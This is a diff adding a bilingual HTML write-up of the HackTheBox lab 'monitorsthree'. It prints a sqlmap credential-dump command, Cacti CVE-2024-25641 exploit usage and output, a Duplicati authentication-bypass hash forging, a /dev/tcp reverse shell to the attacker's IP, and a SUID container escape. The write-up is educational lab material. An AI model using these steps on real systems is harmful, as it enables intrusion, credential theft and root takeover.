@@ -1,0 +1,526 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>monitorsthree | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">monitorsthree</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-medium">medium</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+            <div id="content-en" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+                    <p><strong>Exploitation process:</strong> The attack began by discovering a boolean-based SQL injection vulnerability in the password recovery functionality of the main web application. This SQLi allowed extraction of database credentials, which provided access to a Cacti installation on a subdomain.</p>
+                    
+                    <p>The Cacti instance, running version 1.2.26, was vulnerable to CVE-2024-25641, an authenticated RCE via the Package Import feature. Exploiting this vulnerability granted initial access as <code>www-data</code>.</p>
+                    
+                    <p>Enumeration revealed a Duplicati backup service running in a Docker container on port 8200. By analyzing backup database files in <code>/opt/duplicati/config</code>, I extracted the server passphrase and salt values. Using these, I bypassed Duplicati's authentication by intercepting the login request with Burp Suite, modifying the nonce, and generating a valid password hash using the application's own JavaScript cryptographic functions.</p>
+                    
+                    <p>Once authenticated to Duplicati, I configured a malicious backup job with a pre-backup script containing a reverse shell. Since the Docker container had the entire filesystem mounted at <code>/source</code>, gaining root in the container effectively meant root access to the host system. Final privilege escalation was achieved by setting the SUID bit on <code>/bin/bash</code> from within the container.</p>
+                    
+                    <p><strong>Technologies/Exploits:</strong> Boolean-based SQL injection, Cacti CVE-2024-25641 authenticated RCE, Duplicati authentication bypass via passphrase extraction, Docker container escape via filesystem mount misconfiguration.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Initial Reconnaissance</h2>
+                <p>Starting with an nmap scan to identify open ports and services:</p>
+                <p><img src="./media/image13.png" alt="Nmap scan results showing open ports including SSH on 22 and HTTP on 80" /></p>
+
+                <p>I add <code>monitorsthree.htb</code> to my <code>/etc/hosts</code> file to resolve the domain locally.</p>
+
+                <h2>Web Enumeration</h2>
+                <p>Browsing the web application, I notice it uses PHP in the backend based on the <code>.php</code> file extensions. The site features a login page, a password recovery function, and an admin route.</p>
+
+                <h3>SQL Injection Discovery</h3>
+                <p>While testing various inputs for injection vulnerabilities, I discover an SQL injection in the password recovery functionality:</p>
+                <p><img src="./media/image10.png" alt="Password recovery form showing SQL injection vulnerability" /></p>
+
+                <p>Initially, I attempt to exploit the SQLi with sqlmap, but the default technique it detects is time-based blind injection, which is extremely slow because it relies on delay functions like <code>SLEEP()</code> to identify each character.</p>
+
+                <p>When this happens, it's ideal to test other techniques like boolean-based blind injection, which is significantly faster since it doesn't use delay functions:</p>
+                <p><img src="./media/image4.png" alt="Sqlmap output showing boolean-based blind SQL injection technique" /></p>
+
+                <p>Although sqlmap typically tries various techniques automatically, sometimes it doesn't detect them properly, so it's worth manually specifying the technique.</p>
+
+                <h3>Extracting Database Credentials</h3>
+                <p>My final sqlmap command targets specific tables and columns to minimize extraction time:</p>
+                <pre><code class="language-bash">sqlmap "http://monitorsthree.htb/forgot_password.php" --forms -D "monitorsthree_db" -T users -C username,password --dump --flush-session --technique=B</code></pre>
+
+                <p>The <code>--flush-session</code> flag ensures sqlmap doesn't remember progress from the slower time-based technique, and I only dump the data I need to avoid wasting time.</p>
+
+                <p>I successfully retrieve usernames and password hashes. After running them through CrackStation, I obtain these credentials:</p>
+                <pre><code class="language-plaintext">admin:greencacti2001</code></pre>
+
+                <h2>Virtual Host Discovery</h2>
+                <p>Scanning for virtual hosts with gobuster, I discover an interesting subdomain:</p>
+                <p><img src="./media/image1.png" alt="Gobuster output showing discovered vhost cacti.monitorsthree.htb" /></p>
+
+                <p>I add <code>cacti.monitorsthree.htb</code> to my <code>/etc/hosts</code> file.</p>
+
+                <h2>Cacti Instance - CVE-2024-25641</h2>
+                <p>Navigating to the subdomain, I find a Cacti installation running version 1.2.26. I successfully authenticate using the credentials obtained from the SQL injection: <code>admin:greencacti2001</code>.</p>
+
+                <h3>Vulnerability Research</h3>
+                <p>Searching for exploits affecting this version, I find CVE-2024-25641, which allows authenticated remote code execution: <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-25641">https://nvd.nist.gov/vuln/detail/CVE-2024-25641</a></p>
+
+                <p>I locate a working exploit on Exploit-DB: <a href="https://www.exploit-db.com/exploits/52225">https://www.exploit-db.com/exploits/52225</a></p>
+
+                <p>The vulnerability description explains:</p>
+                <blockquote>
+                    <p>"Prior to version 1.2.27, an arbitrary file write vulnerability, exploitable through the 'Package Import' feature, allows authenticated users having the 'Import Templates' permission to execute arbitrary PHP code on the web server. The vulnerability is located within the <code>import_package()</code> function defined in the <code>/lib/import.php</code> script. The function blindly trusts the filename and file content provided within the XML data, and writes such files into the Cacti base path (or even outside, since path traversal sequences are not filtered). This can be exploited to write or overwrite arbitrary files on the web server, leading to execution of arbitrary PHP code or other security impacts."</p>
+                </blockquote>
+
+                <h3>Exploitation</h3>
+                <p>I set up a netcat listener to catch the reverse shell:</p>
+                <pre><code class="language-bash">sudo nc -lvnp 443</code></pre>
+
+                <p>Then I execute the exploit script:</p>
+                <pre><code class="language-bash">python3 cve-2024-25641 --url http://cacti.monitorsthree.htb/cacti/ --user admin --password greencacti2001 --lhost 10.10.16.18 --lport 443</code></pre>
+
+                <p>The exploit generates the following output:</p>
+                <pre><code class="language-plaintext">CVE-2024-25641 - Cacti 1.2.26 Authenticated RCE
+
+[*] Checking Cacti version...
+[+] Version seems to be 1.2.26
+[*] Logging in on http://cacti.monitorsthree.htb/cacti/index.php
+[+] Successfully logged in as admin
+[*] Generating malicious payload...
+[+] Malicious GZIP: vdfwaaoumc.php.gz
+[*] Uploading GZIP file...
+[+] Successfully uploaded GZIP file
+[*] Validating success...
+[+] Success!
+[*] Triggering reverse shell by sending GET request to http://cacti.monitorsthree.htb/cacti/resource/vdfwaaoumc.php
+[+] Check your netcat listener</code></pre>
+
+                <p>I receive the shell connection and gain access as the <code>www-data</code> user.</p>
+
+                <h2>Internal Enumeration</h2>
+                <p>Exploring the system, I find the user <code>marcus</code> in <code>/home</code>. Checking for internal services, I discover some interesting open ports:</p>
+                <p><img src="./media/image12.png" alt="Netstat output showing internal ports including 8084 and 8200" /></p>
+
+                <p>Port 8084 is particularly interesting because it wasn't visible in my external nmap scan, suggesting it's bound to localhost only.</p>
+
+                <h3>Process Analysis</h3>
+                <p>Examining running processes with <code>ps -faux</code>, I find this curious entry:</p>
+                <pre><code class="language-bash">www-data 1247 0.0 1.0 283944 41724 ? Sl 18:02 0:00 /usr/bin/mono /usr/lib/mono/4.5/xsp4.exe --port 8084 --address 0.0.0.0 --appconfigdir /etc/xsp4 --nonstop</code></pre>
+
+                <p>Investigating the configuration:</p>
+                <pre><code class="language-bash">cat /etc/xsp4/conf.d/monodoc-http/10_monodoc-http</code></pre>
+
+                <pre><code class="language-plaintext"># This is the configuration file
+# for the monodoc-http
+path = /usr/share/monodoc/web
+alias = /monodoc</code></pre>
+
+                <h3>Backup Discovery</h3>
+                <p>In <code>/opt/backups/cacti</code>, I find several zipped backup files:</p>
+                <pre><code class="language-bash">ls -la /opt/backups/cacti</code></pre>
+
+                <pre><code class="language-plaintext">total 19728
+drwxr-xr-x 2 root root    4096 Nov  1 18:02 .
+drwxr-xr-x 3 root root    4096 May 20  2024 ..
+-rw-r--r-- 1 root root  172507 May 26  2024 duplicati-20240526T162923Z.dlist.zip
+-rw-r--r-- 1 root root  172088 Aug 20  2024 duplicati-20240820T113028Z.dlist.zip
+-rw-r--r-- 1 root root  172089 Nov  1 18:02 duplicati-20251101T180222Z.dlist.zip</code></pre>
+
+                <p>Examining these files, I find they indicate Duplicati version <code>2.0.8.1</code>.</p>
+
+                <h3>Duplicati Configuration</h3>
+                <p>In <code>/opt/duplicati/config</code>, I find two SQLite3 databases that I transfer to my machine for inspection. Additionally, checking the Docker Compose configuration reveals what's running on port 8200:</p>
+                <pre><code class="language-bash">cat /opt/docker-compose.yml</code></pre>
+
+                <pre><code class="language-yaml">version: "3"
+services:
+  duplicati:
+    image: lscr.io/linuxserver/duplicati:latest
+    container_name: duplicati
+    environment:
+      - PUID=0
+      - PGID=0
+      - TZ=Etc/UTC
+    volumes:
+      - /opt/duplicati/config:/config
+      - /:/source
+    ports:
+      - 127.0.0.1:8200:8200
+    restart: unless-stopped</code></pre>
+
+                <p>The most critical detail here is that the entire root filesystem (<code>/</code>) is mounted to <code>/source</code> inside the container, which will become very useful later.</p>
+
+                <h2>Port Forwarding with Chisel</h2>
+                <p>To access the Duplicati web interface on port 8200, I use chisel for port forwarding. After setting up the tunnel and accessing the service in my browser, I see the Duplicati login page:</p>
+                <p><img src="./media/image7.png" alt="Duplicati web interface login page" /></p>
+
+                <h2>Duplicati Authentication Bypass</h2>
+                <p>Knowing the Duplicati version, I search for vulnerabilities and find this guide explaining how to bypass login authentication when you have access to a database backup: <a href="https://read.martiandefense.org/duplicati-bypassing-login-authentication-with-server-passphrase-024d6991e9ee">https://read.martiandefense.org/duplicati-bypassing-login-authentication-with-server-passphrase-024d6991e9ee</a></p>
+
+                <h3>Extracting Credentials from Database</h3>
+                <p>From the SQLite database, I extract these two critical values:</p>
+                <pre><code class="language-plaintext">-2||server-passphrase|Wb6e855L3sN9LTaCuwPXuautswTIQbekmMAr7BrK2Ho=
+-2||server-passphrase-salt|xTfykWV1dATpFZvPhClEJLJzYA5A4L74hX7FK8XmY0I=</code></pre>
+
+                <h3>Intercepting the Login Process</h3>
+                <p>The bypass technique works by intercepting the login process. When attempting to authenticate, Duplicati requests a nonce from the server. I intercept this response using Burp Suite's "intercept response" feature, allowing me to see and modify the server's response:</p>
+                <p><img src="./media/image9.png" alt="Burp Suite showing intercepted Duplicati nonce response" /></p>
+
+                <p>I notice the salt matches the one from the database I examined earlier.</p>
+
+                <h3>Generating Valid Password</h3>
+                <p>Using Duplicati's own JavaScript cryptographic functions from the login page, I can generate a valid password. I open the browser's developer console and examine the functions:</p>
+                <p><img src="./media/image2.png" alt="Browser console showing Duplicati's password generation JavaScript functions" /></p>
+
+                <p>I generate a valid password by modifying the values with the nonce I intercepted with Burp Suite, and passing the <code>server-passphrase</code> value from the database after decoding it from base64 and converting it to hexadecimal:</p>
+                <p><img src="./media/image11.png" alt="Browser console showing password generation process with nonce and passphrase values" /></p>
+
+                <pre><code class="language-javascript">var noncedpwd = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(CryptoJS.enc.Base64.parse('6cKT6Hb7ids03XT9ytkpAhZDLqaJWzaDwKtDOkaj8lo=') + '59be9ef39e4bdec37d2d3682bb03d7b9abadb304c841b7a498c02bec1acad87a')).toString(CryptoJS.enc.Base64);</code></pre>
+
+                <p>This generates the following value:</p>
+                <pre><code class="language-plaintext">/VNXBGqZ7v6fUvpTLaQvLQKZUxV/0hEfeAhrFc/yoww=</code></pre>
+
+                <p>After forwarding the intercepted request in Burp Suite, I modify the password parameter with this URL-encoded value and successfully authenticate to Duplicati:</p>
+                <p><img src="./media/image8.png" alt="Duplicati dashboard showing successful authentication" /></p>
+
+                <h2>Privilege Escalation via Duplicati</h2>
+                <p>Now that I have access to Duplicati, I can exploit it to gain elevated privileges. I create a new backup configuration with a malicious pre-backup script:</p>
+                <p><img src="./media/image3.png" alt="Duplicati backup configuration showing script execution options" /></p>
+
+                <h3>Creating the Malicious Script</h3>
+                <p>I create a simple bash script containing a reverse shell payload:</p>
+                <pre><code class="language-bash">cat /tmp/xd.sh</code></pre>
+
+                <pre><code class="language-bash">bash -i >& /dev/tcp/10.10.16.18/443 0>&1</code></pre>
+
+                <p>I set execution permissions on the script:</p>
+                <pre><code class="language-bash">chmod +x /tmp/xd.sh</code></pre>
+
+                <h3>Triggering the Exploit</h3>
+                <p>I click "Run now" on the backup job:</p>
+                <p><img src="./media/image6.png" alt="Duplicati interface showing the Run now button for the backup job" /></p>
+
+                <p>I receive a shell as root in the Docker container:</p>
+                <pre><code class="language-bash">sudo nc -lvnp 443</code></pre>
+
+                <pre><code class="language-plaintext">listening on [any] 443 ...
+connect to [10.10.16.18] from (UNKNOWN) [10.10.11.30] 41874
+sh: 0: can't access tty; job control turned off
+# whoami
+root</code></pre>
+
+                <h3>Container Escape</h3>
+                <p>Remember from the docker-compose configuration that the entire filesystem is mounted at <code>/source</code> inside the container. This means I have write access to the entire host filesystem. I can easily escalate to root on the host system by setting the SUID bit on <code>/bin/bash</code>:</p>
+                <pre><code class="language-bash">chmod u+s /source/bin/bash</code></pre>
+
+                <p>Back in my <code>www-data</code> shell on the host:</p>
+                <pre><code class="language-bash">bash -p</code></pre>
+
+                <pre><code class="language-plaintext">bash-5.1# whoami
+root
+bash-5.1# cat /root/root.txt
+[ROOT FLAG]</code></pre>
+
+                <h2>User Access - Marcus</h2>
+                <p>To complete the machine properly, I need to obtain user access to the <code>marcus</code> account. The intended path was likely to get user access first, then use SSH local port forwarding instead of chisel.</p>
+
+                <h3>MySQL Enumeration</h3>
+                <p>In <code>/var/www/html/cacti/include/config.php</code>, I find MySQL credentials:</p>
+                <pre><code class="language-php">$database_username = 'cactiuser';
+$database_password = 'cactiuser';</code></pre>
+
+                <p>Different MySQL users can have access to different resources, so I connect to explore other databases. I find a database called <code>cacti</code> (different from the <code>monitorsthree_db</code> found via SQLi), and in the <code>user_auth</code> table, I discover password hashes:</p>
+                <p><img src="./media/image5.png" alt="MySQL output showing user_auth table with password hashes" /></p>
+
+                <p>Marcus's hash is particularly interesting at this point.</p>
+
+                <h3>Password Cracking</h3>
+                <p>I crack the hash using hashcat with mode 3200 for bcrypt:</p>
+                <pre><code class="language-bash">hashcat -m 3200 '$2y$10$Fq8wGXvlM3Le.5LIzmM9weFs9s6W2i1FLg3yrdNGmkIaxo79IBjtK' /usr/share/wordlists/rockyou.txt</code></pre>
+
+                <p>The hash cracks successfully:</p>
+                <pre><code class="language-plaintext">$2y$10$Fq8wGXvlM3Le.5LIzmM9weFs9s6W2i1FLg3yrdNGmkIaxo79IBjtK:12345678910</code></pre>
+
+                <p>I verify these credentials work for the <code>marcus</code> user:</p>
+                <pre><code class="language-plaintext">marcus:12345678910</code></pre>
+
+                <p>I can now authenticate as marcus via SSH or switch user on the system, allowing me to retrieve the user flag and complete the machine through the intended path.</p>
+            </div>
+
+            <div id="content-es" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+                    <p><strong>Resumen del proceso:</strong> El ataque comenzó al descubrir una vulnerabilidad de inyección SQL basada en booleanos en la funcionalidad de recuperación de contraseña de la aplicación web principal. Esta SQLi permitió extraer credenciales de la base de datos, que proporcionaron acceso a una instalación de Cacti en un subdominio.</p>
+                    
+                    <p>La instancia de Cacti, ejecutando la versión 1.2.26, era vulnerable a CVE-2024-25641, un RCE autenticado mediante la funcionalidad de Importación de Paquetes. Explotar esta vulnerabilidad otorgó acceso inicial como <code>www-data</code>.</p>
+                    
+                    <p>La enumeración reveló un servicio de backup Duplicati ejecutándose en un contenedor Docker en el puerto 8200. Al analizar los archivos de base de datos de backup en <code>/opt/duplicati/config</code>, extraje los valores de passphrase y salt del servidor. Utilizando estos, hice un bypass de la autenticación de Duplicati interceptando la petición de login con Burp Suite, modificando el nonce y generando un hash de contraseña válido usando las propias funciones criptográficas JavaScript de la aplicación.</p>
+                    
+                    <p>Una vez autenticado en Duplicati, configuré un trabajo de backup malicioso con un script pre-backup conteniendo una reverse shell. Como el contenedor Docker tenía todo el sistema de archivos montado en <code>/source</code>, obtener root en el contenedor significaba efectivamente acceso root al sistema host. La escalada final de privilegios se logró estableciendo el bit SUID en <code>/bin/bash</code> desde dentro del contenedor.</p>
+                    
+                    <p><strong>Tecnologías/Exploits:</strong> Inyección SQL basada en booleanos, Cacti CVE-2024-25641 RCE autenticado, bypass de autenticación Duplicati mediante extracción de passphrase, escape de contenedor Docker mediante mala configuración de montaje del sistema de archivos.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comienzo con un escaneo de nmap para identificar puertos abiertos y servicios:</p>
+                <p><img src="./media/image13.png" alt="Resultados del escaneo de nmap mostrando puertos abiertos incluyendo SSH en el 22 y HTTP en el 80" /></p>
+
+                <p>Añado <code>monitorsthree.htb</code> a mi archivo <code>/etc/hosts</code> para resolver el dominio localmente.</p>
+
+                <h2>Enumeración Web</h2>
+                <p>Navegando por la aplicación web, noto que usa PHP en el backend basándome en las extensiones de archivo <code>.php</code>. El sitio presenta una página de login, una función de recuperación de contraseña y una ruta de admin.</p>
+
+                <h3>Descubrimiento de Inyección SQL</h3>
+                <p>Mientras pruebo varios inputs en busca de vulnerabilidades de inyección, descubro una inyección SQL en la funcionalidad de recuperación de contraseña:</p>
+                <p><img src="./media/image10.png" alt="Formulario de recuperación de contraseña mostrando vulnerabilidad de inyección SQL" /></p>
+
+                <p>Inicialmente, intento explotar la SQLi con sqlmap, pero la técnica por defecto que detecta es inyección ciega basada en tiempo, que es extremadamente lenta porque se basa en funciones de retardo como <code>SLEEP()</code> para identificar cada carácter.</p>
+
+                <p>Cuando esto ocurre, es ideal probar otras técnicas como la inyección ciega basada en booleanos, que es significativamente más rápida ya que no usa funciones de retardo:</p>
+                <p><img src="./media/image4.png" alt="Salida de sqlmap mostrando técnica de inyección SQL ciega basada en booleanos" /></p>
+
+                <p>Aunque sqlmap típicamente prueba varias técnicas automáticamente, a veces no las detecta correctamente, así que vale la pena especificar manualmente la técnica.</p>
+
+                <h3>Extracción de Credenciales de la Base de Datos</h3>
+                <p>Mi comando final de sqlmap apunta a tablas y columnas específicas para minimizar el tiempo de extracción:</p>
+                <pre><code class="language-bash">sqlmap "http://monitorsthree.htb/forgot_password.php" --forms -D "monitorsthree_db" -T users -C username,password --dump --flush-session --technique=B</code></pre>
+
+                <p>El flag <code>--flush-session</code> asegura que sqlmap no recuerde el progreso de la técnica más lenta basada en tiempo, y solo hago dump de los datos que necesito para evitar perder tiempo.</p>
+
+                <p>Recupero exitosamente nombres de usuario y hashes de contraseñas. Después de pasarlos por CrackStation, obtengo estas credenciales:</p>
+                <pre><code class="language-plaintext">admin:greencacti2001</code></pre>
+
+                <h2>Descubrimiento de Virtual Host</h2>
+                <p>Escaneando virtual hosts con gobuster, descubro un subdominio interesante:</p>
+                <p><img src="./media/image1.png" alt="Salida de gobuster mostrando vhost descubierto cacti.monitorsthree.htb" /></p>
+
+                <p>Añado <code>cacti.monitorsthree.htb</code> a mi archivo <code>/etc/hosts</code>.</p>
+
+                <h2>Instancia de Cacti - CVE-2024-25641</h2>
+                <p>Navegando al subdominio, encuentro una instalación de Cacti ejecutando la versión 1.2.26. Me autentico exitosamente usando las credenciales obtenidas de la inyección SQL: <code>admin:greencacti2001</code>.</p>
+
+                <h3>Investigación de Vulnerabilidades</h3>
+                <p>Buscando exploits que afecten a esta versión, encuentro CVE-2024-25641, que permite ejecución remota de código autenticada: <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-25641">https://nvd.nist.gov/vuln/detail/CVE-2024-25641</a></p>
+
+                <p>Localizo un exploit funcional en Exploit-DB: <a href="https://www.exploit-db.com/exploits/52225">https://www.exploit-db.com/exploits/52225</a></p>
+
+                <p>La descripción de la vulnerabilidad explica:</p>
+                <blockquote>
+                    <p>"Antes de la versión 1.2.27, una vulnerabilidad de escritura arbitraria de archivos, explotable a través de la funcionalidad 'Package Import', permite a usuarios autenticados con el permiso 'Import Templates' ejecutar código PHP arbitrario en el servidor web. La vulnerabilidad se encuentra dentro de la función <code>import_package()</code> definida en el script <code>/lib/import.php</code>. La función confía ciegamente en el nombre de archivo y el contenido del archivo proporcionados dentro de los datos XML, y escribe dichos archivos en la ruta base de Cacti (o incluso fuera, ya que las secuencias de path traversal no se filtran). Esto puede explotarse para escribir o sobrescribir archivos arbitrarios en el servidor web, llevando a la ejecución de código PHP arbitrario u otros impactos de seguridad."</p>
+                </blockquote>
+
+                <h3>Explotación</h3>
+                <p>Configuro un listener de netcat para capturar la reverse shell:</p>
+                <pre><code class="language-bash">sudo nc -lvnp 443</code></pre>
+
+                <p>Luego ejecuto el script del exploit:</p>
+                <pre><code class="language-bash">python3 cve-2024-25641 --url http://cacti.monitorsthree.htb/cacti/ --user admin --password greencacti2001 --lhost 10.10.16.18 --lport 443</code></pre>
+
+                <p>El exploit genera la siguiente salida:</p>
+                <pre><code class="language-plaintext">CVE-2024-25641 - Cacti 1.2.26 Authenticated RCE
+
+[*] Checking Cacti version...
+[+] Version seems to be 1.2.26
+[*] Logging in on http://cacti.monitorsthree.htb/cacti/index.php
+[+] Successfully logged in as admin
+[*] Generating malicious payload...
+[+] Malicious GZIP: vdfwaaoumc.php.gz
+[*] Uploading GZIP file...
+[+] Successfully uploaded GZIP file
+[*] Validating success...
+[+] Success!
+[*] Triggering reverse shell by sending GET request to http://cacti.monitorsthree.htb/cacti/resource/vdfwaaoumc.php
+[+] Check your netcat listener</code></pre>
+
+                <p>Recibo la conexión de shell y obtengo acceso como usuario <code>www-data</code>.</p>
+
+                <h2>Enumeración Interna</h2>
+                <p>Explorando el sistema, encuentro al usuario <code>marcus</code> en <code>/home</code>. Comprobando servicios internos, descubro algunos puertos abiertos interesantes:</p>
+                <p><img src="./media/image12.png" alt="Salida de netstat mostrando puertos internos incluyendo 8084 y 8200" /></p>
+
+                <p>El puerto 8084 es particularmente interesante porque no era visible en mi escaneo nmap externo, sugiriendo que está vinculado solo a localhost.</p>
+
+                <h3>Análisis de Procesos</h3>
+                <p>Examinando los procesos en ejecución con <code>ps -faux</code>, encuentro esta entrada curiosa:</p>
+                <pre><code class="language-bash">www-data 1247 0.0 1.0 283944 41724 ? Sl 18:02 0:00 /usr/bin/mono /usr/lib/mono/4.5/xsp4.exe --port 8084 --address 0.0.0.0 --appconfigdir /etc/xsp4 --nonstop</code></pre>
+
+                <p>Investigando la configuración:</p>
+                <pre><code class="language-bash">cat /etc/xsp4/conf.d/monodoc-http/10_monodoc-http</code></pre>
+
+                <pre><code class="language-plaintext"># This is the configuration file
+# for the monodoc-http
+path = /usr/share/monodoc/web
+alias = /monodoc</code></pre>
+
+                <h3>Descubrimiento de Backups</h3>
+                <p>En <code>/opt/backups/cacti</code>, encuentro varios archivos de backup zipeados:</p>
+                <pre><code class="language-bash">ls -la /opt/backups/cacti</code></pre>
+
+                <pre><code class="language-plaintext">total 19728
+drwxr-xr-x 2 root root    4096 Nov  1 18:02 .
+drwxr-xr-x 3 root root    4096 May 20  2024 ..
+-rw-r--r-- 1 root root  172507 May 26  2024 duplicati-20240526T162923Z.dlist.zip
+-rw-r--r-- 1 root root  172088 Aug 20  2024 duplicati-20240820T113028Z.dlist.zip
+-rw-r--r-- 1 root root  172089 Nov  1 18:02 duplicati-20251101T180222Z.dlist.zip</code></pre>
+
+                <p>Examinando estos archivos, encuentro que indican la versión de Duplicati <code>2.0.8.1</code>.</p>
+
+                <h3>Configuración de Duplicati</h3>
+                <p>En <code>/opt/duplicati/config</code>, encuentro dos bases de datos SQLite3 que transfiero a mi máquina para inspeccionar. Además, revisando la configuración de Docker Compose revela qué se está ejecutando en el puerto 8200:</p>
+                <pre><code class="language-bash">cat /opt/docker-compose.yml</code></pre>
+
+                <pre><code class="language-yaml">version: "3"
+services:
+  duplicati:
+    image: lscr.io/linuxserver/duplicati:latest
+    container_name: duplicati
+    environment:
+      - PUID=0
+      - PGID=0
+      - TZ=Etc/UTC
+    volumes:
+      - /opt/duplicati/config:/config
+      - /:/source
+    ports:
+      - 127.0.0.1:8200:8200
+    restart: unless-stopped</code></pre>
+
+                <p>El detalle más crítico aquí es que todo el sistema de archivos raíz (<code>/</code>) está montado en <code>/source</code> dentro del contenedor, lo cual será muy útil más adelante.</p>
+
+                <h2>Port Forwarding con Chisel</h2>
+                <p>Para acceder a la interfaz web de Duplicati en el puerto 8200, uso chisel para port forwarding. Después de configurar el túnel y acceder al servicio en mi navegador, veo la página de login de Duplicati:</p>
+                <p><img src="./media/image7.png" alt="Página de login de la interfaz web de Duplicati" /></p>
+
+                <h2>Bypass de Autenticación de Duplicati</h2>
+                <p>Conociendo la versión de Duplicati, busco vulnerabilidades y encuentro esta guía explicando cómo hacer bypass de la autenticación de login cuando tienes acceso a un backup de la base de datos: <a href="https://read.martiandefense.org/duplicati-bypassing-login-authentication-with-server-passphrase-024d6991e9ee">https://read.martiandefense.org/duplicati-bypassing-login-authentication-with-server-passphrase-024d6991e9ee</a></p>
+
+                <h3>Extracción de Credenciales de la Base de Datos</h3>
+                <p>De la base de datos SQLite, extraigo estos dos valores críticos:</p>
+                <pre><code class="language-plaintext">-2||server-passphrase|Wb6e855L3sN9LTaCuwPXuautswTIQbekmMAr7BrK2Ho=
+-2||server-passphrase-salt|xTfykWV1dATpFZvPhClEJLJzYA5A4L74hX7FK8XmY0I=</code></pre>
+
+                <h3>Interceptando el Proceso de Login</h3>
+                <p>La técnica de bypass funciona interceptando el proceso de login. Cuando se intenta autenticar, Duplicati solicita un nonce al servidor. Intercepto esta respuesta usando la funcionalidad "intercept response" de Burp Suite, permitiéndome ver y modificar la respuesta del servidor:</p>
+                <p><img src="./media/image9.png" alt="Burp Suite mostrando la respuesta interceptada del nonce de Duplicati" /></p>
+
+                <p>Noto que el salt coincide con el de la base de datos que examiné anteriormente.</p>
+
+                <h3>Generando Contraseña Válida</h3>
+                <p>Usando las propias funciones criptográficas JavaScript de Duplicati de la página de login, puedo generar una contraseña válida. Abro la consola del desarrollador del navegador y examino las funciones:</p>
+                <p><img src="./media/image2.png" alt="Consola del navegador mostrando funciones JavaScript de generación de contraseña de Duplicati" /></p>
+
+                <p>Genero una contraseña válida modificando los valores con el nonce que intercepté con Burp Suite, y pasando el valor de <code>server-passphrase</code> de la base de datos después de decodificarlo de base64 y convertirlo a hexadecimal:</p>
+                <p><img src="./media/image11.png" alt="Consola del navegador mostrando proceso de generación de contraseña con valores de nonce y passphrase" /></p>
+
+                <pre><code class="language-javascript">var noncedpwd = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(CryptoJS.enc.Base64.parse('6cKT6Hb7ids03XT9ytkpAhZDLqaJWzaDwKtDOkaj8lo=') + '59be9ef39e4bdec37d2d3682bb03d7b9abadb304c841b7a498c02bec1acad87a')).toString(CryptoJS.enc.Base64);</code></pre>
+
+                <p>Esto genera el siguiente valor:</p>
+                <pre><code class="language-plaintext">/VNXBGqZ7v6fUvpTLaQvLQKZUxV/0hEfeAhrFc/yoww=</code></pre>
+
+                <p>Después de reenviar la petición interceptada en Burp Suite, modifico el parámetro de contraseña con este valor URL-encodeado y me autentico exitosamente en Duplicati:</p>
+                <p><img src="./media/image8.png" alt="Panel de Duplicati mostrando autenticación exitosa" /></p>
+
+                <h2>Escalada de Privilegios mediante Duplicati</h2>
+                <p>Ahora que tengo acceso a Duplicati, puedo explotarlo para obtener privilegios elevados. Creo una nueva configuración de backup con un script pre-backup malicioso:</p>
+                <p><img src="./media/image3.png" alt="Configuración de backup de Duplicati mostrando opciones de ejecución de script" /></p>
+
+                <h3>Creando el Script Malicioso</h3>
+                <p>Creo un script bash simple conteniendo un payload de reverse shell:</p>
+                <pre><code class="language-bash">cat /tmp/xd.sh</code></pre>
+
+                <pre><code class="language-bash">bash -i >& /dev/tcp/10.10.16.18/443 0>&1</code></pre>
+
+                <p>Establezco permisos de ejecución en el script:</p>
+                <pre><code class="language-bash">chmod +x /tmp/xd.sh</code></pre>
+
+                <h3>Desencadenando el Exploit</h3>
+                <p>Hago clic en "Run now" en el trabajo de backup:</p>
+                <p><img src="./media/image6.png" alt="Interfaz de Duplicati mostrando el botón Run now para el trabajo de backup" /></p>
+
+                <p>Recibo una shell como root en el contenedor Docker:</p>
+                <pre><code class="language-bash">sudo nc -lvnp 443</code></pre>
+
+                <pre><code class="language-plaintext">listening on [any] 443 ...
+connect to [10.10.16.18] from (UNKNOWN) [10.10.11.30] 41874
+sh: 0: can't access tty; job control turned off
+# whoami
+root</code></pre>
+
+                <h3>Escape del Contenedor</h3>
+                <p>Recordad de la configuración de docker-compose que todo el sistema de archivos está montado en <code>/source</code> dentro del contenedor. Esto significa que tengo acceso de escritura a todo el sistema de archivos del host. Puedo escalar fácilmente a root en el sistema host estableciendo el bit SUID en <code>/bin/bash</code>:</p>
+                <pre><code class="language-bash">chmod u+s /source/bin/bash</code></pre>
+
+                <p>De vuelta en mi shell <code>www-data</code> en el host:</p>
+                <pre><code class="language-bash">bash -p</code></pre>
+
+                <pre><code class="language-plaintext">bash-5.1# whoami
+root
+bash-5.1# cat /root/root.txt
+[FLAG DE ROOT]</code></pre>
+
+                <h2>Acceso de Usuario - Marcus</h2>
